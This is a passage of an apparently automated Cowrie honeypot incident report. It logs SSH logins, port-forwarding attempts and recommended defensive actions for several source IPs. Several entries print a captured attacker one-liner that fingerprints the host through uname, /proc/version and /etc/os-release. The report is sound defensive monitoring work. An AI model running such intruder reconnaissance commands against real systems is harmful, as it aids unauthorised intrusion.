| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:50:16` | `cowrie.session.connect` |
| `2026-08-01 21:50:17` | `cowrie.client.version` |
| `2026-08-01 21:50:17` | `cowrie.client.kex` |
| `2026-08-01 21:50:18` | `cowrie.login.success` |
| `2026-08-01 21:50:19` | `cowrie.direct-tcpip.request` |
| `2026-08-01 21:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.69.255[.]239` to AbuseIPDB if not already reported
- [ ] Block `117.69.255[.]239` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fb9e0897da9

| Field | Detail |
|---|---|
| **Source IP** | `182.76.71[.]82` |
| **First Seen** | 2026-08-01 21:53 |
| **Last Seen** | 2026-08-01 21:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:53:52` | `cowrie.session.connect` |
| `2026-08-01 21:53:52` | `cowrie.client.version` |
| `2026-08-01 21:53:52` | `cowrie.client.kex` |
| `2026-08-01 21:53:54` | `cowrie.login.success` |
| `2026-08-01 21:53:55` | `cowrie.direct-tcpip.request` |
| `2026-08-01 21:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.71[.]82` to AbuseIPDB if not already reported
- [ ] Block `182.76.71[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2685426f98ff

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-08-01 21:54 |
| **Last Seen** | 2026-08-01 21:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:54:00` | `cowrie.session.connect` |
| `2026-08-01 21:54:01` | `cowrie.client.version` |
| `2026-08-01 21:54:01` | `cowrie.client.kex` |
| `2026-08-01 21:54:03` | `cowrie.login.success` |
| `2026-08-01 21:54:03` | `cowrie.direct-tcpip.request` |
| `2026-08-01 21:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52b9a221db45

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-08-01 21:58 |
| **Last Seen** | 2026-08-01 21:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:58:29` | `cowrie.session.connect` |
| `2026-08-01 21:58:29` | `cowrie.client.version` |
| `2026-08-01 21:58:29` | `cowrie.client.kex` |
| `2026-08-01 21:58:31` | `cowrie.login.success` |
| `2026-08-01 21:58:32` | `cowrie.direct-tcpip.request` |
| `2026-08-01 21:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a9b2281d65b

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-08-01 21:58 |
| **Last Seen** | 2026-08-01 21:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:58:37` | `cowrie.session.connect` |
| `2026-08-01 21:58:38` | `cowrie.client.version` |
| `2026-08-01 21:58:38` | `cowrie.client.kex` |
| `2026-08-01 21:58:39` | `cowrie.login.success` |
| `2026-08-01 21:58:40` | `cowrie.direct-tcpip.request` |
| `2026-08-01 21:58:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a12e793347b

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]72` |
| **First Seen** | 2026-08-01 21:59 |
| **Last Seen** | 2026-08-01 21:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:59:02` | `cowrie.session.connect` |
| `2026-08-01 21:59:03` | `cowrie.client.version` |
| `2026-08-01 21:59:03` | `cowrie.client.kex` |
| `2026-08-01 21:59:05` | `cowrie.login.success` |
| `2026-08-01 21:59:06` | `cowrie.direct-tcpip.request` |
| `2026-08-01 21:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]72` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d330074beb4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 21:59 |
| **Last Seen** | 2026-08-01 21:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:59:53` | `cowrie.session.connect` |
| `2026-08-01 21:59:53` | `cowrie.client.version` |
| `2026-08-01 21:59:53` | `cowrie.client.kex` |
| `2026-08-01 21:59:53` | `cowrie.login.success` |
| `2026-08-01 21:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-800f81a385cd

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 21:59 |
| **Last Seen** | 2026-08-01 21:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:59:53` | `cowrie.session.connect` |
| `2026-08-01 21:59:53` | `cowrie.client.version` |
| `2026-08-01 21:59:53` | `cowrie.client.kex` |
| `2026-08-01 21:59:53` | `cowrie.login.success` |
| `2026-08-01 21:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdc90755e8ad

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 21:59 |
| **Last Seen** | 2026-08-01 21:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:59:56` | `cowrie.session.connect` |
| `2026-08-01 21:59:56` | `cowrie.client.version` |
| `2026-08-01 21:59:56` | `cowrie.client.kex` |
| `2026-08-01 21:59:56` | `cowrie.login.success` |
| `2026-08-01 21:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b981cf10a74

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 21:59 |
| **Last Seen** | 2026-08-01 21:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:59:56` | `cowrie.session.connect` |
| `2026-08-01 21:59:56` | `cowrie.client.version` |
| `2026-08-01 21:59:56` | `cowrie.client.kex` |
| `2026-08-01 21:59:56` | `cowrie.login.success` |
| `2026-08-01 21:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16fc80ea3231

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:04 |
| **Last Seen** | 2026-08-01 22:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:04:09` | `cowrie.session.connect` |
| `2026-08-01 22:04:10` | `cowrie.client.version` |
| `2026-08-01 22:04:10` | `cowrie.client.kex` |
| `2026-08-01 22:04:13` | `cowrie.login.success` |
| `2026-08-01 22:04:16` | `cowrie.session.params` |
| `2026-08-01 22:04:16` | `cowrie.command.input` |
| `2026-08-01 22:04:16` | `cowrie.command.input` |
| `2026-08-01 22:04:16` | `cowrie.command.input` |
| `2026-08-01 22:04:16` | `cowrie.command.input` |
| `2026-08-01 22:04:16` | `cowrie.command.input` |
| `2026-08-01 22:04:16` | `cowrie.command.success` |
| `2026-08-01 22:04:16` | `cowrie.command.input` |
| `2026-08-01 22:04:16` | `cowrie.command.input` |
| `2026-08-01 22:04:16` | `cowrie.command.input` |
| `2026-08-01 22:04:16` | `cowrie.command.input` |
| `2026-08-01 22:04:16` | `cowrie.log.closed` |
| `2026-08-01 22:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3543a198704b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:06 |
| **Last Seen** | 2026-08-01 22:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:06:38` | `cowrie.session.connect` |
| `2026-08-01 22:06:38` | `cowrie.client.version` |
| `2026-08-01 22:06:38` | `cowrie.client.kex` |
| `2026-08-01 22:06:40` | `cowrie.login.success` |
| `2026-08-01 22:06:42` | `cowrie.session.params` |
| `2026-08-01 22:06:42` | `cowrie.command.input` |
| `2026-08-01 22:06:42` | `cowrie.command.input` |
| `2026-08-01 22:06:42` | `cowrie.command.input` |
| `2026-08-01 22:06:42` | `cowrie.command.input` |
| `2026-08-01 22:06:42` | `cowrie.command.input` |
| `2026-08-01 22:06:42` | `cowrie.command.success` |
| `2026-08-01 22:06:42` | `cowrie.command.input` |
| `2026-08-01 22:06:42` | `cowrie.command.input` |
| `2026-08-01 22:06:42` | `cowrie.command.input` |
| `2026-08-01 22:06:42` | `cowrie.command.input` |
| `2026-08-01 22:06:43` | `cowrie.log.closed` |
| `2026-08-01 22:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b2b6a308cf3

| Field | Detail |
|---|---|
| **Source IP** | `177.174.89[.]99` |
| **First Seen** | 2026-08-01 22:08 |
| **Last Seen** | 2026-08-01 22:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:08:05` | `cowrie.session.connect` |
| `2026-08-01 22:08:06` | `cowrie.client.version` |
| `2026-08-01 22:08:06` | `cowrie.client.kex` |
| `2026-08-01 22:08:07` | `cowrie.login.success` |
| `2026-08-01 22:08:08` | `cowrie.direct-tcpip.request` |
| `2026-08-01 22:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.89[.]99` to AbuseIPDB if not already reported
- [ ] Block `177.174.89[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-415d058f04d8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:09 |
| **Last Seen** | 2026-08-01 22:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:09:12` | `cowrie.session.connect` |
| `2026-08-01 22:09:12` | `cowrie.client.version` |
| `2026-08-01 22:09:12` | `cowrie.client.kex` |
| `2026-08-01 22:09:14` | `cowrie.login.success` |
| `2026-08-01 22:09:15` | `cowrie.session.params` |
| `2026-08-01 22:09:15` | `cowrie.command.input` |
| `2026-08-01 22:09:15` | `cowrie.command.input` |
| `2026-08-01 22:09:15` | `cowrie.command.input` |
| `2026-08-01 22:09:15` | `cowrie.command.input` |
| `2026-08-01 22:09:15` | `cowrie.command.input` |
| `2026-08-01 22:09:15` | `cowrie.command.success` |
| `2026-08-01 22:09:15` | `cowrie.command.input` |
| `2026-08-01 22:09:15` | `cowrie.command.input` |
| `2026-08-01 22:09:15` | `cowrie.command.input` |
| `2026-08-01 22:09:15` | `cowrie.command.input` |
| `2026-08-01 22:09:16` | `cowrie.log.closed` |
| `2026-08-01 22:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f96df6c1f8f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:11 |
| **Last Seen** | 2026-08-01 22:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:11:44` | `cowrie.session.connect` |
| `2026-08-01 22:11:44` | `cowrie.client.version` |
| `2026-08-01 22:11:44` | `cowrie.client.kex` |
| `2026-08-01 22:11:46` | `cowrie.login.success` |
| `2026-08-01 22:11:48` | `cowrie.session.params` |
| `2026-08-01 22:11:48` | `cowrie.command.input` |
| `2026-08-01 22:11:48` | `cowrie.command.input` |
| `2026-08-01 22:11:48` | `cowrie.command.input` |
| `2026-08-01 22:11:48` | `cowrie.command.input` |
| `2026-08-01 22:11:48` | `cowrie.command.input` |
| `2026-08-01 22:11:48` | `cowrie.command.success` |
| `2026-08-01 22:11:48` | `cowrie.command.input` |
| `2026-08-01 22:11:48` | `cowrie.command.input` |
| `2026-08-01 22:11:48` | `cowrie.command.input` |
| `2026-08-01 22:11:48` | `cowrie.command.input` |
| `2026-08-01 22:11:48` | `cowrie.log.closed` |
| `2026-08-01 22:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6583e644bd3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-01 22:12 |
| **Last Seen** | 2026-08-01 22:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:12:48` | `cowrie.session.connect` |
| `2026-08-01 22:12:48` | `cowrie.client.version` |
| `2026-08-01 22:12:48` | `cowrie.client.kex` |
| `2026-08-01 22:12:48` | `cowrie.login.success` |
| `2026-08-01 22:12:48` | `cowrie.direct-tcpip.request` |
| `2026-08-01 22:12:49` | `cowrie.direct-tcpip.data` |
| `2026-08-01 22:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2ef2da00497

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:14 |
| **Last Seen** | 2026-08-01 22:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:14:21` | `cowrie.session.connect` |
| `2026-08-01 22:14:21` | `cowrie.client.version` |
| `2026-08-01 22:14:21` | `cowrie.client.kex` |
| `2026-08-01 22:14:22` | `cowrie.login.success` |
| `2026-08-01 22:14:23` | `cowrie.session.params` |
| `2026-08-01 22:14:23` | `cowrie.command.input` |
| `2026-08-01 22:14:23` | `cowrie.command.input` |
| `2026-08-01 22:14:23` | `cowrie.command.input` |
| `2026-08-01 22:14:23` | `cowrie.command.input` |
| `2026-08-01 22:14:23` | `cowrie.command.input` |
| `2026-08-01 22:14:23` | `cowrie.command.success` |
| `2026-08-01 22:14:23` | `cowrie.command.input` |
| `2026-08-01 22:14:23` | `cowrie.command.input` |
| `2026-08-01 22:14:23` | `cowrie.command.input` |
| `2026-08-01 22:14:23` | `cowrie.command.input` |
| `2026-08-01 22:14:24` | `cowrie.log.closed` |
| `2026-08-01 22:14:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e030cd5815b8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:19 |
| **Last Seen** | 2026-08-01 22:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:19:37` | `cowrie.session.connect` |
| `2026-08-01 22:19:37` | `cowrie.client.version` |
| `2026-08-01 22:19:37` | `cowrie.client.kex` |
| `2026-08-01 22:19:38` | `cowrie.login.success` |
| `2026-08-01 22:19:39` | `cowrie.session.params` |
| `2026-08-01 22:19:39` | `cowrie.command.input` |
| `2026-08-01 22:19:39` | `cowrie.command.input` |
| `2026-08-01 22:19:39` | `cowrie.command.input` |
| `2026-08-01 22:19:39` | `cowrie.command.input` |
| `2026-08-01 22:19:39` | `cowrie.command.input` |
| `2026-08-01 22:19:39` | `cowrie.command.success` |
| `2026-08-01 22:19:39` | `cowrie.command.input` |
| `2026-08-01 22:19:39` | `cowrie.command.input` |
| `2026-08-01 22:19:39` | `cowrie.command.input` |
| `2026-08-01 22:19:39` | `cowrie.command.input` |
| `2026-08-01 22:19:40` | `cowrie.log.closed` |
| `2026-08-01 22:19:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bef633ab388

| Field | Detail |
|---|---|
| **Source IP** | `192.220.58[.]65` |
| **First Seen** | 2026-08-01 22:20 |
| **Last Seen** | 2026-08-01 22:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:20:38` | `cowrie.session.connect` |
| `2026-08-01 22:20:38` | `cowrie.client.version` |
| `2026-08-01 22:20:38` | `cowrie.client.kex` |
| `2026-08-01 22:20:38` | `cowrie.login.success` |
| `2026-08-01 22:20:39` | `cowrie.session.params` |
| `2026-08-01 22:20:39` | `cowrie.command.input` |
| `2026-08-01 22:20:39` | `cowrie.log.closed` |
| `2026-08-01 22:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.220.58[.]65` to AbuseIPDB if not already reported
- [ ] Block `192.220.58[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14ea2eb14035

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:22 |
| **Last Seen** | 2026-08-01 22:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:22:05` | `cowrie.session.connect` |
